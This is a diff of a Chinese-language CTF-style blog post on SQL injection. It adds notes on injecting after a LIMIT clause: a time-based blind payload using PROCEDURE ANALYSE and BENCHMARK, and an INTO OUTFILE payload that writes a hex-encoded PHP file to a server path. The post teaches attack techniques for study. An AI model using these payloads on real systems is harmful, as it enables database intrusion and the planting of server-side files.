@@ -351,14 +351,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-10
+                    2020-04-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.1k
+                    4.2k
                 </div>
                 
 
@@ -487,8 +487,11 @@ select * from ctf where flag = 1 and 0 and get_lock(&#39;username&#39;,5);</code
       | INTO var_name [, var_name]] 
     [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><p>可以看到在limit 后面其实还可以跟<code>PROCEDURE</code>和<code>INTO</code>这就是可以利用的地方了，<code>INFO</code>写入文件需要知道绝对绝对路径和写入shell权限，比较难利用，一般用<code>PROCEDURE</code></p>
 <p>payload</p>
-<pre><code>select * from admin limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></pre><p>如果利用时间盲注的话，貌似sleep是不行的 ，可以用<code>BENCHMARK</code></p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote>
+<pre><code>select * from admin limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></pre><p>如果利用时间盲注的话，貌似sleep是不行的 ，可以用<code>BENCHMARK</code><br>2020.4.14补充：<br>延时注入payload</p>
+<pre><code>procedure analyse((extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000,SHA1(1)),1))))),1);%23
+
+测试网上的带有select，都失败了 limit后面应该是不能又select的不知道是不是我的原因，还是其他师傅们的payload有问题</code></pre><p>写shell payload</p>
+<pre><code>into outfile &#39;D:/2.php&#39; LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e</code></pre><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote>
 <p>一、当某字符的大小为一个字节时，称其字符为窄字节.<br>二、当某字符的大小为两个字节时，称其字符为宽字节.<br>三、所有英文默认占一个字节，汉字占两个字节<br>四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</p>
 </blockquote>
 <p>转义函数：</p>
@@ -912,7 +915,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;苦逼博主已经肝了&nbsp;<span
-                class="white-color">37.1k</span>&nbsp;字
+                class="white-color">37.6k</span>&nbsp;字
             
             
             
